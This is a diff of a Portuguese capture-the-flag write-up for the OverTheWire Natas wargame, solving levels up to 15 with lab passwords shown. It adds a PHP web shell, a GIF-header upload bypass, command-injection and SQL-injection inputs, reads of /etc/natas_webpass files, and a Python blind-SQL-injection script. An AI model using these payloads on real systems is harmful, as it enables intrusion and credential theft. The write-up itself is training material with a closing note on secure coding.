@@ -40,7 +40,7 @@ No nível seguinte, nos deparamos com uma restrição adicional: o clique com o 
 
 <img width="547" height="147" alt="Captura de tela 2025-11-20 204818" src="https://github.com/user-attachments/assets/0362371a-4e83-4b0a-803c-54aae97fb3c2" />
 
-Para contornar este bloqueio, é possível utilizar o atalho do teclado `Ctrl + U`, que permite visualizar o código-fonte da página diretamente, mesmo com o clique direito desabilitado.
+Para contornar este bloqueio, é possível utilizar o atalho do teclado __`Ctrl + U`__, que permite visualizar o código-fonte da página diretamente, mesmo com o clique direito desabilitado.
 
 Após acessar o código-fonte da página, rapidamente identificamos a chave necessária para avançar ao próximo nível do desafio.
 
@@ -64,7 +64,7 @@ Ao acessarmos o link, somos redirecionados para uma nova página que, aparenteme
 
 <img width="535" height="360" alt="Captura de tela 2025-11-20 212106" src="https://github.com/user-attachments/assets/a40fbe6c-afe0-45bc-b9f0-8c4ad6903543" />
 
-Ao observar com um pouco mais de atenção o link identificado, notamos que ele contém um caminho adicional na [URL](https://tecnoblog.net/responde/o-que-e-url/) , especificamente um diretório denominado `/files/` antes do arquivo pixel.png, podendo indicar a existência de outros recursos acessíveis nesse mesmo diretório.
+Ao observar com um pouco mais de atenção o link identificado, notamos que ele contém um caminho adicional na [URL](https://tecnoblog.net/responde/o-que-e-url/) , especificamente um diretório denominado __`/files/`__ antes do arquivo pixel.png, podendo indicar a existência de outros recursos acessíveis nesse mesmo diretório.
 
 Acessando o diretório /files/, encontramos um arquivo denominado user.txt.
 
@@ -88,7 +88,7 @@ A análise do código-fonte revela uma dica sutil, indicando que o conteúdo nã
 
 <img width="1366" height="328" alt="Captura de tela 2025-11-20 214604" src="https://github.com/user-attachments/assets/601b64bf-d8c6-4cca-99da-cbcbe470d2bd" />
 
-Ao analisarmos o arquivo `/robots.txt` — que contém instruções para robôs de mecanismos de busca, como o Googlebot, sobre quais páginas ou seções do site devem ser rastreadas ou ignoradas — identificamos um novo diretório `/s3cr3t/`. Ao acessá-lo, encontramos novamente uma página com um arquivo denominado user.txt.
+Ao analisarmos o arquivo __`/robots.txt`__ — que contém instruções para robôs de mecanismos de busca, como o Googlebot, sobre quais páginas ou seções do site devem ser rastreadas ou ignoradas — identificamos um novo diretório __`/s3cr3t/`__. Ao acessá-lo, encontramos novamente uma página com um arquivo denominado user.txt.
 
 <img width="677" height="332" alt="Captura de tela 2025-11-20 215114" src="https://github.com/user-attachments/assets/0cf3981c-b57d-494f-a765-5224668db988" />
 
@@ -110,11 +110,11 @@ Ao recarregar a página, uma nova frase é exibida:
 
 <img width="749" height="210" alt="Captura de tela 2025-11-26 213526" src="https://github.com/user-attachments/assets/62314d18-9706-4dcd-a8ab-679b0de3a34a" />
 
-Indicando que a chave só poderá ser acessada por um usuário autorizado; nesse caso, o acesso deve ocorrer a partir de `http://natas5.natas.labs.overthewire.org/`
+Indicando que a chave só poderá ser acessada por um usuário autorizado; nesse caso, o acesso deve ocorrer a partir de __`http://natas5.natas.labs.overthewire.org/`__
 
 Para contornar isso, utilizamos o Burp Suite, que funciona como um proxy capaz de interceptar e manipular o tráfego entre o navegador e o servidor.
 
-Com o Burp Suite aberto e o navegador configurado para utilizar o proxy, acesse `http://natas4.natas.labs.overthewire.org/`para que a requisição seja capturada em __Proxy → Intercept__. Na mensagem interceptada, localizamos o cabeçalho __Referer__, que aparece como `Referer: http://natas4.natas.labs.overthewire.org/`, e o substituimos por `Referer: http://natas5.natas.labs.overthewire.org/`. 
+Com o Burp Suite aberto e o navegador configurado para utilizar o proxy, acesse __`http://natas4.natas.labs.overthewire.org/`__para que a requisição seja capturada em __Proxy → Intercept__. Na mensagem interceptada, localizamos o cabeçalho __Referer__, que aparece como __`Referer: http://natas4.natas.labs.overthewire.org/`__, e o substituimos por __`Referer: http://natas5.natas.labs.overthewire.org/`__. 
 
 <img width="1905" height="786" alt="Screenshot_2025-11-26_18_48_10" src="https://github.com/user-attachments/assets/05027ee4-5acf-49c9-8dde-798fbd663fb4" />
 
@@ -134,7 +134,7 @@ Enunciado do nível:
 
 De acordo com o enunciado, o desafio verifica se o usuário está autenticado ou não. É provável que o site utilize [cookies de sessão](https://www.cookieyes.com/blog/session-cookies/) para controlar o estado de login. Com base nisso, o objetivo passa a ser identificar o cookie responsável pela autenticação e manipular seu valor de forma a simular um usuário autorizado.
 
-Para realizar essa manipulação, é necessário acessar o [__DevTools__](https://learn.microsoft.com/pt-br/microsoft-edge/devtools/overview) do navegador e abrir a aba de Cookies. Em seguida, deve-se localizar o cookie associado ao domínio `natas5.natas.labs.overthewire.or`. Após identificar o cookie responsável pela autenticação, basta alterar seu valor — que provavelmente estará definido como __0__ — para __1__, simulando assim um estado de usuário autenticado.
+Para realizar essa manipulação, é necessário acessar o [__DevTools__](https://learn.microsoft.com/pt-br/microsoft-edge/devtools/overview) do navegador e abrir a aba de Cookies. Em seguida, deve-se localizar o cookie associado ao domínio __`natas5.natas.labs.overthewire.or`__. Após identificar o cookie responsável pela autenticação, basta alterar seu valor — que provavelmente estará definido como __0__ — para __1__, simulando assim um estado de usuário autenticado.
 
 <img width="1920" height="251" alt="Screenshot_2025-11-26_20_40_37" src="https://github.com/user-attachments/assets/2fe437d5-0f0b-4170-bf2c-452e320c518a" />
 
@@ -160,7 +160,7 @@ Além disso, a página disponibiliza um link que permite acessar diretamente o c
 
 Ao analisar o código, identificamos uma linha com a seguinte estrutura:
 
-`include "includes/secret.inc";`
+__`include "includes/secret.inc";`__
 
 Esse trecho revela que o sistema está importando um arquivo externo, localizado em __includes/secret.inc__. Isso indica que a chave necessária para avançar no desafio está acessível diretamente por meio dessa URL. Assim, ao acessar o caminho correspondente no navegador, conseguimos visualizar o conteúdo do arquivo e obter a entrada sevreta.
 
@@ -180,11 +180,11 @@ A página disponibiliza os seguintes links:
 
 <img width="743" height="174" alt="Captura de tela 2025-11-27 211624" src="https://github.com/user-attachments/assets/d496ba13-e3b5-4bc2-8a3b-10da587997f6" />
 
-Ao acessar um dos links fornecidos, é possível observar que a página utiliza o parâmetro `page` para decidir qual arquivo será incluído e exibido.
+Ao acessar um dos links fornecidos, é possível observar que a página utiliza o parâmetro __`page`__ para decidir qual arquivo será incluído e exibido.
 
 <img width="465" height="40" alt="Captura de tela 2025-11-27 214529" src="https://github.com/user-attachments/assets/a082a7f2-fc8b-4778-a68b-1a9b1128a787" />
 
-Se o código da aplicação permite incluir qualquer arquivo por meio do parâmetro page, podemos explorar essa funcionalidade para “forçar” o site a carregar o arquivo secreto. Os níveis do Natas seguem um padrão em que a senha para o próximo nível fica armazenada em um arquivo dentro da pasta `/etc/natas_webpass/`. Assim, ao manipular a URL e definir o parâmetro page para apontar diretamente para esse arquivo, conseguimos que o servidor o inclua e exiba seu conteúdo. 
+Se o código da aplicação permite incluir qualquer arquivo por meio do parâmetro page, podemos explorar essa funcionalidade para “forçar” o site a carregar o arquivo secreto. Os níveis do Natas seguem um padrão em que a senha para o próximo nível fica armazenada em um arquivo dentro da pasta __`/etc/natas_webpass/`__. Assim, ao manipular a URL e definir o parâmetro page para apontar diretamente para esse arquivo, conseguimos que o servidor o inclua e exiba seu conteúdo. 
 
 <img width="624" height="32" alt="Captura de tela 2025-11-27 215343" src="https://github.com/user-attachments/assets/c1a182b6-624c-4858-8fbb-eeb94b113d25" />
 
@@ -206,7 +206,7 @@ Além disso, é disponibilizado um link para o código-fonte.
 
 <img width="1335" height="809" alt="Captura de tela 2025-11-27 223956" src="https://github.com/user-attachments/assets/15c7300c-fce0-455b-9058-e06b501f42dd" />
 
-Ao analisar o código-fonte, percebemos que a aplicação espera uma entrada igual a __3d3d516343746d4d6d6c315669563362__. No entanto, essa entrada não é utilizada diretamente, pois passa por uma transformação realizada pela função `encodeSecret()`. 
+Ao analisar o código-fonte, percebemos que a aplicação espera uma entrada igual a __3d3d516343746d4d6d6c315669563362__. No entanto, essa entrada não é utilizada diretamente, pois passa por uma transformação realizada pela função __`encodeSecret()`__. 
 
 Utilizando o seguinte script em [Python](https://aws.amazon.com/pt/what-is/python/), conseguimos inverter o processo aplicado pela função e recuperar o valor original da entrada secreta.
 
@@ -244,7 +244,7 @@ E novamente um link para acessar o código-fonte.
 
 Ao analisar o código, podemos perceber a possibilidade de injeção de comandos.
 
-Portanto, ao inserir o comando `; cat /etc/natas_webpass/natas10` no campo de busca, a aplicação executa esse trecho adicional no [shell](https://www.datacamp.com/pt/blog/what-is-shell). Isso acontece porque o caractere `;` atua como um separador de comandos, permitindo que instruções diferentes sejam encadeadas. Dessa forma, conseguimos forçar o sistema a exibir diretamente o conteúdo do arquivo que contém a senha do próximo nível
+Portanto, ao inserir o comando __`; cat /etc/natas_webpass/natas10`__ no campo de busca, a aplicação executa esse trecho adicional no [shell](https://www.datacamp.com/pt/blog/what-is-shell). Isso acontece porque o caractere `;` atua como um separador de comandos, permitindo que instruções diferentes sejam encadeadas. Dessa forma, conseguimos forçar o sistema a exibir diretamente o conteúdo do arquivo que contém a senha do próximo nível
 
 <img width="746" height="207" alt="Captura de tela 2025-11-27 232644" src="https://github.com/user-attachments/assets/30926a2f-5709-4462-99e1-8ea24d7dde47" />
 
@@ -265,9 +265,9 @@ Assim como no nível anterior, novamente nos é fornecido um link para o código
 
 Ao analisar o código-fonte, percebemos que sua estrutura é bastante semelhante à do nível anterior. No entanto, há uma diferença importante, foram adicionadas restrições quanto aos caracteres permitidos na entrada.
 
-Utilizando a expressão `.* /etc/natas_webpass/natas11` como entrada, conseguimos explorar a forma como a aplicação trata os parâmetros e, com isso, forçar a leitura de arquivos específicos dentro de um diretório.
+Utilizando a expressão __`.* /etc/natas_webpass/natas11`__ como entrada, conseguimos explorar a forma como a aplicação trata os parâmetros e, com isso, forçar a leitura de arquivos específicos dentro de um diretório.
 
-O uso de `.*` funciona como um coringa, permitindo que o sistema interprete a entrada de maneira mais ampla e aceite caminhos adicionais. Dessa forma, é possível direcionar a aplicação para incluir o arquivo que contém a senha do próximo nível, mesmo diante das restrições impostas pelo código.
+O uso de __`.*`__ funciona como um coringa, permitindo que o sistema interprete a entrada de maneira mais ampla e aceite caminhos adicionais. Dessa forma, é possível direcionar a aplicação para incluir o arquivo que contém a senha do próximo nível, mesmo diante das restrições impostas pelo código.
 
 <img width="747" height="333" alt="Captura de tela 2025-11-28 184015" src="https://github.com/user-attachments/assets/47b92a63-b178-4b85-a87c-b81bee662206" />
 
@@ -283,8 +283,8 @@ O enunciado informa que os cookies estão protegidos por uma criptografia [XOR](
 
 A aplicação oferece a possibilidade de selecionar a cor do background do site. Esse recurso, embora pareça apenas estético, está diretamente ligado ao funcionamento dos cookies e à forma como eles são manipulados.
 
-Além disso, o cookie contém o campo `showpassword`, inicialmente definido como `no`. A lógica do sistema indica que, se esse valor for alterado para `yes`, a aplicação revelará a senha do próximo nível. O problema é que o cookie não está armazenado em texto puro: ele passa por uma função chamada `xor_encrypt()`, que aplica uma criptografia simples baseada em XOR.
-Como não temos acesso direto à chave utilizada por essa função, não é possível modificar o cookie manualmente de forma imediata. O desafio, portanto, consiste em descobrir ou deduzir a chave XOR para que possamos decifrar o cookie atual, alterar o campo `showpassword` para `yes`, e então recriptografar o valor corretamente. Só assim o sistema aceitará o cookie modificado e exibirá a senha.
+Além disso, o cookie contém o campo __`showpassword`__, inicialmente definido como __`no`__. A lógica do sistema indica que, se esse valor for alterado para `yes`, a aplicação revelará a senha do próximo nível. O problema é que o cookie não está armazenado em texto puro: ele passa por uma função chamada __`xor_encrypt()`__, que aplica uma criptografia simples baseada em XOR.
+Como não temos acesso direto à chave utilizada por essa função, não é possível modificar o cookie manualmente de forma imediata. O desafio, portanto, consiste em descobrir ou deduzir a chave XOR para que possamos decifrar o cookie atual, alterar o campo __`showpassword`__ para __`yes`__, e então recriptografar o valor corretamente. Só assim o sistema aceitará o cookie modificado e exibirá a senha.
 
 Para validar o funcionamento da criptografia XOR e gerar o novo cookie, podemos utilizar um [compilador PHP online](https://www.programiz.com/php/online-compiler/) junto com o seguinte código:
 
@@ -435,15 +435,19 @@ Também é possível notar que a extensão `.jpg` está sendo adicionada diretam
 
 Podemos explorar isso criando um script PHP no terminal do [linux](https://www.ibm.com/br-pt/think/topics/linux):
 
-`nano shell.php`
+__`nano shell.php`__
 
-Após isso, abrimos as ferramentas de DevTools e alteramos o elemento do formulário HTML (provavelmente será algo similar a `<input type="hidden" name="filename" value="abc123.jpg">`) para `<input type="hidden" name="filename" value="abc123.php">`.
+Com o seguinte código:
+
+__`<?php echo shell_exec($_GET['e'].' 2>&1'); ?>`__
+
+Após isso, abrimos as ferramentas de DevTools e alteramos o elemento do formulário HTML (provavelmente será algo similar a __`<input type="hidden" name="filename" value="abc123.jpg">`__) para __`<input type="hidden" name="filename" value="abc123.php">`__.
 
 <img width="1277" height="461" alt="Captura de tela 2025-11-29 191135" src="https://github.com/user-attachments/assets/2c24a2ea-ceb3-4501-91e9-e7e9f20e54a8" />
 
 Após editar o formulário e alterar a extensão para `.php`, realizamos o upload do arquivo para o servidor. O servidor salva o arquivo com o nome: 
 
-`upload/abc123.php`
+__`upload/abc123.php`__
 
  Em seguida, basta acessar o link gerado após o upload. Como o arquivo contém código PHP válido, ao ser acessado ele será executado pelo servidor e o resultado será a chave para o próximo nível.
 
@@ -459,7 +463,7 @@ O nivel possui o seguinte enunciado:
 
 <img width="749" height="285" alt="Captura de tela 2025-12-01 231915" src="https://github.com/user-attachments/assets/ef01722f-12ad-44d9-9c1c-6af3ad4f665e" />
 
-Seu código-fonte é similar ao anterior, mas adiciona uma verificação de segurança usando a função `exif_imagetype()` do PHP, para garantir que o arquivo enviado seja realmente uma imagem.
+Seu código-fonte é similar ao anterior, mas adiciona uma verificação de segurança usando a função __`exif_imagetype()`__ do PHP, para garantir que o arquivo enviado seja realmente uma imagem.
 
 ```
 <html>
@@ -540,8 +544,8 @@ Choose a JPEG to upload (max 1KB):<br/>
 </body>
 </html>
 
-```
-A função `exif_imagetype()` realiza uma verificação simples para garantir que o arquivo enviado seja realmente uma imagem. Ela não analisa o conteúdo completo do arquivo, mas apenas os primeiros bytes — conhecidos como [magic bytes](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5) — que funcionam como uma assinatura única de cada formato.
+``` 
+A função __`exif_imagetype()`__ realiza uma verificação simples para garantir que o arquivo enviado seja realmente uma imagem. Ela não analisa o conteúdo completo do arquivo, mas apenas os primeiros bytes — conhecidos como [magic bytes](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5) — que funcionam como uma assinatura única de cada formato.
 
 <img width="1062" height="70" alt="Captura de tela 2025-12-02 151317" src="https://github.com/user-attachments/assets/40d32741-49b9-4ed2-b75a-1cb9a98ad637" />
 
@@ -549,11 +553,11 @@ Esses magic bytes permitem identificar extensões comuns como GIF, JPEG, PNG, en
 
 Para isso, utilizamos o seguinte código PHP:
 
-`GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>`
+__`GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>`__
 
 > GIF87a pertence ao tipo de arquivo __GIF (Graphics Interchange Format)__.
 
-Após isso, abrimos as ferramentas de DevTools e alteramos o elemento do formulário HTML de ``<input type="hidden" name="filename" value="abc123.jpg">`` para `<input type="hidden" name="filename" value="abc123.php>`.
+Após isso, abrimos as ferramentas de DevTools e alteramos o elemento do formulário HTML de __``<input type="hidden" name="filename" value="abc123.jpg">``__ para __`<input type="hidden" name="filename" value="abc123.php>`__.
 
 <img width="1291" height="560" alt="Captura de tela 2025-12-01 231824" src="https://github.com/user-attachments/assets/29f0bad7-be88-421a-ad84-856efe6e1b42" />
 
@@ -561,4 +565,127 @@ Após editar o formulário e alterar a extensão para `.php`, realizamos o uploa
 
 <img width="836" height="67" alt="Captura de tela 2025-12-01 232126" src="https://github.com/user-attachments/assets/03fac6a8-d3b6-47fb-8c7e-39d9c00fc2f3" />
 
+Durante a análise, observamos que o sistema retorna uma mensagem de erro quando não recebe o valor esperado no parâmetro de consulta. Isso indica que o servidor está aguardando um input específico para processar.
+
+Ao fornecer o parâmetro:
+
+__`?e=ls`__
+
+o servidor interpreta o valor como um comando do sistema operacional. Nesse caso, o comando [ls](https://guialinux.uniriotec.br/ls/) é executado, resultando na listagem de todos os arquivos presentes no diretório da aplicação.
+
+<img width="1869" height="316" alt="Captura de tela 2025-12-01 232310" src="https://github.com/user-attachments/assets/296e53c8-320b-4364-8e2b-9f240a1c9e8a" />
+
+Se fornecermos a entrada __`?e=cat /etc/natas_webpass/natas14`__ ao nosso webshell, o servidor executará o comando [cat](https://guialinux.uniriotec.br/cat/).
+
+<img width="774" height="37" alt="Captura de tela 2025-12-02 145629" src="https://github.com/user-attachments/assets/a63869bf-cfcf-40fa-a7f7-cbbc9ee4d240" />
+
+Exibindo o conteúdo do arquivo e revelando a chave necessária para avançar ao próximo nível.
+
+<img width="442" height="40" alt="Captura de tela 2025-12-02 145636" src="https://github.com/user-attachments/assets/3a32dd4c-071d-4308-bb61-1051a412322e" />
+
+> chave: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+
+
+#### nível 14 → 15
+
+> credenciais: natas14 / z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+
+O nível exibe uma tela de login:
+
+<img width="745" height="248" alt="Captura de tela 2025-12-02 190210" src="https://github.com/user-attachments/assets/92d54afb-a533-4024-ab14-06af226bc86e" />
+
+E o seguinte código-fonte:
+
+<img width="1339" height="832" alt="Captura de tela 2025-12-02 195419" src="https://github.com/user-attachments/assets/0583944b-4066-4207-80b4-72702407831a" />
+
+Analizando a aplicação, identificamos uma vulnerabilidade de __[injeção de SQL](https://www.cloudflare.com/pt-br/learning/security/threats/sql-injection/)__ no processo de autenticação. A consulta utilizada pelo sistema não realiza validação adequada dos parâmetros fornecidos pelo usuário, permitindo que comandos SQL sejam injetados diretamente.
+
+Ao inserir o seguinte valor no campo de nome de usuário:
+
+__`"OR 1=1#`__
+
+conseguimos manipular a lógica da consulta. O operador __`"OR 1=1`__ força a condição a retornar verdadeiro independentemente do restante da cláusula, enquanto o símbolo __`#`__ transforma o restante da instrução em comentário, ignorando qualquer verificação adicional. Assim obtendo a chave de acesso do próximo nível.
+
+<img width="748" height="192" alt="Captura de tela 2025-12-02 201917" src="https://github.com/user-attachments/assets/de902d76-a2a1-4eca-a13c-8a395eeef1fa" />
+
+> chave: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+
+#### nível 15
+
+> credenciais: natas15 / SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+
+O nível solicita um username:
+
+<img width="748" height="192" alt="Captura de tela 2025-12-02 201917" src="https://github.com/user-attachments/assets/988b28e2-a53b-464b-8229-856d391771a4" />
+
+E possui o seguinte código-fonte:
+
+<img width="1225" height="900" alt="Captura de tela 2025-12-02 211641" src="https://github.com/user-attachments/assets/57f2aac8-314f-47d5-b9ef-06ae965fdd5a" />
+
+O código é similar ao do nível anterior, porém apresenta uma lógica um pouco mais complexa. A diferença principal está no tipo de resposta que recebemos: em vez de obter diretamente o resultado da consulta ou mensagens detalhadas, o sistema apenas informa se o usuário existe ou não na base de dados.
+
+No entanto, existe uma vulnerabilidade de __injeção SQL__ no campo de nome de usuário. Diferente do nível anterior, aqui estamos diante de uma __injeção cega__, ou seja, não temos acesso direto ao resultado da consulta ou mensagens detalhadas do banco de dados. A aplicação retorna apenas respostas binárias — verdadeiro ou falso — indicando se a condição da consulta foi satisfeita ou não.
+
+Para facilitar a exploração dessa vulnerabilidade de Blind SQL Injection, podemos automatizar o processo utilizando o seguinte script em Python:
+
+```
+import requests
+import string
+
+# Target URL and credentials
+url = "http://natas15.natas.labs.overthewire.org/index.php"
+username = "natas15"
+password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
+
+# Characters to test (all letters and numbers)
+charset = string.ascii_letters + string.digits
+
+# Storage for the extracted password
+extracted_password = ""
+
+# Session to maintain connection and auth
+session = requests.Session()
+session.auth = (username, password)
+
+print("[*] Starting password extraction...")
+
+# We know the password is 32 characters from previous levels
+for position in range(1, 33):
+    for char in charset:
+        # Craft the boolean-based injection payload
+        payload = {
+            'username': f'natas16" AND SUBSTRING(password,{position},1)=\'{char}\' -- -'
+        }
+        
+        # Send the request
+        response = session.post(url, data=payload)
+        
+        # Check if the character is correct (boolean response)
+        if "This user exists" in response.text:
+            extracted_password += char
+            print(f"[+] Found character {position}: {char} → Current: {extracted_password}")
+            break
+    
+    # If we didn't find a character (shouldn't happen for natas)
+    if len(extracted_password) < position:
+        print(f"[-] Couldn't find character at position {position}")
+        break
+
+print(f"[!] Complete password: {extracted_password}")
+
+```
+O script funciona de uma maneira bastante simples: ele executa um loop que testa, caractere por caractere, possíveis valores da senha do usuário __natas16__.
+A cada iteração, o script envia uma requisição ao servidor com uma condição SQL construída para verificar se determinado caractere corresponde à posição atual da senha. Como a aplicação retorna apenas respostas binárias (verdadeiro ou falso), o script interpreta esse comportamento e confirma quando um caractere está correto.
+
+<img width="761" height="738" alt="Captura de tela 2025-12-02 231938" src="https://github.com/user-attachments/assets/5ab725a5-1920-4167-a872-cb7b1caa67c5" />
+
+<img width="619" height="605" alt="Captura de tela 2025-12-02 230912" src="https://github.com/user-attachments/assets/1f5f5592-61b3-435b-ace7-64e06e834db4" />
+
+> chave: hpkjkyvilqctew33qmuxl6edvfmw4sgo
+
+#### Comclusão
+
+Essa série de desafios demonstra, de forma prática e progressiva, como diferentes vulnerabilidades podem ser exploradas em aplicações web. Cada nível apresenta um cenário específico, começando com falhas simples de autenticação e avançando para técnicas mais sofisticadas, como __Command Injection__ e __Blind SQL Injection__.
+O objetivo é mostrar que, mesmo pequenas brechas na validação de entradas ou na lógica de consultas, podem ser utilizadas para comprometer a segurança de um sistema. Ao longo dos níveis, aprendemos a identificar padrões de falhas, compreender como a aplicação responde a entradas manipuladas e aplicar métodos de exploração adequados a cada contexto.
+Mais do que ensinar a exploração, os desafios reforçam a importância de boas práticas de desenvolvimento seguro: uso de consultas parametrizadas, sanitização de entradas, restrição de privilégios e monitoramento constante.
 
